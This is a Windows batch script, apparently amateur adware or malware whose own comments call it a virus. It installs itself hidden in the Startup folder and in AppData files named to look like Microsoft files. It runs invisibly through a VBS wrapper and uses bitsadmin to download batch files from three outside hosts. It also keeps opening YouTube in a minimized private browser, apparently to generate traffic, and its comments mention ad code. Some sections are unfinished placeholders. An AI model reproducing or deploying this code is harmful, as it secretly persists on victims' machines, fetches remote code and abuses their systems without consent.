@echo off

REM If the old virus exists, this will delete the files where they are stored.
IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" 
	del C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat	
IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\regedit.bat"
	del C:\Users\%username%\AppData\Roaming\Microsoft\regedit.bat	
IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\regedit.vbs"
	del C:\Users\%username%\AppData\Roaming\Microsoft\regedit.vbs




	
REM Makes the batch file invisible so no CMD prompt shows. puts the invisible code in a vbs file.
type NUL > C:\Users\%username%\Desktop\msdfmap.vbs
set pwd=CreateObject("Wscript.Shell").Run """" ^^^& WScript.Arguments(0) ^^^& """", 0, False
ECHO %pwd% >> C:\Users\%username%\Desktop\msdfmap.vbs




REM This runs the invisible vbs script with a batch file. in this case it is msdfmap.bat  to make the batch file invisible.
REM It then sends the code to the startup.bat batch file so the computer boots up it runs the batch file invisibly.
type NUL > C:\Users\%username%\Desktop\startup.bat
ECHO @echo off >> C:\Users\%username%\Desktop\startup.bat
ECHO wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat >> C:\Users\%username%\Desktop\startup.bat




REM This builds the code for msdfmap.bat
REM msdfmap.bat is designed to open the internet to a specific website in incognito mode and minimized every 4 minutes
type NUL > C:\Users\%username%\Desktop\msdfmap.bat
ECHO @echo off >> C:\Users\%username%\Desktop\msdfmap.bat
REM The below  code downloads a new update. Three different sources incase one goes down.  This adds the code to the msdfmap.bat file.
ECHO IF EXIST "C:\Users\%username%\Desktop\downloadtest.bat" ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO 	echo "it's here!" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO 	bitsadmin /transfer n /download /priority normal "https://raw.githubusercontent.com/bnichs5/testwebsite/master/downloadtest.bat" "C:\Users\%username%\Desktop\downloadtest.bat" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO )	 >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO IF EXIST "C:\Users\%username%\Desktop\downloadtest.bat" ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO     echo "it's here!" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO     bitsadmin /transfer n /download /priority normal "https://bitbucket.org/w1672993/testwebsite/downloads/downloadtest.bat" "C:\Users\%username%\Desktop\downloadtest.bat" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ) >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO IF EXIST "C:\Users\%username%\Desktop\htmltest.bat" ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO     echo "it's here!" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO     bitsadmin /transfer n /download /priority normal "http://androidfriends.onlinewebshop.net/htmltest.bat" "C:\Users\%username%\Desktop\htmltest.bat" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ) >> C:\Users\%username%\Desktop\msdfmap.bat
REM The below code loops opening the youtube every 4 minutes. Closes youtube after 35 seconds. 
ECHO :loop >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO start /min iexplore -private http://youtube.com >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ping -n 35 127.0.0.1 > nul >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO taskkill /f /im iexplore.exe >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ping -n 205 127.0.0.1 > nul >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO goto loop >> C:\Users\%username%\Desktop\msdfmap.bat



REM This code runs the newly downloaded update. 
//////////
//////////
//////////
//////////
	


REM This code builds an index.html incase I want to input ad code without a centralized website.
REM type NUL > C:\Users\%username%\Desktop\index.txt
REM ECHO ^<html^> >> C:\Users\%username%\Desktop\index.txt
REM ECHO ^<body^> >> C:\Users\%username%\Desktop\index.txt
REM ECHO Hello >> C:\Users\%username%\Desktop\index.txt
REM ECHO ^</body^> >> C:\Users\%username%\Desktop\index.txt
REM ECHO ^</html^> >> C:\Users\%username%\Desktop\index.txt
REM REN C:\Users\%username%\Desktop\index.txt index2.html



REM This code copies each of the created files to specific folders. 
copy "C:\Users\%username%\Desktop\startup.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy "C:\Users\%username%\Desktop\msdfmap.bat" "C:\Users\%username%\AppData\Roaming\Microsoft"
copy "C:\Users\%username%\Desktop\msdfmap.vbs" "C:\Users\%username%\AppData\Roaming\Microsoft"
REM copy "C:\Users\%username%\Desktop\index.html" "C:\Users\%username%\AppData\Local"



REM After the files above are copied, this code deletes the original created files. This acts as a cut and paste.
del C:\Users\%username%\Desktop\startup.bat
del C:\Users\%username%\Desktop\msdfmap.bat
del C:\Users\%username%\Desktop\msdfmap.vbs
REM del C:\Users\%username%\Desktop\index.html



REM Incase this is converted to an exe file this will delete the exe file. 
REM del virusremover.exe



REM This code runs the startup batch script. Needs to be added
REM start "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"
////////////////////
///////////////////
////////////////////
//////////////





















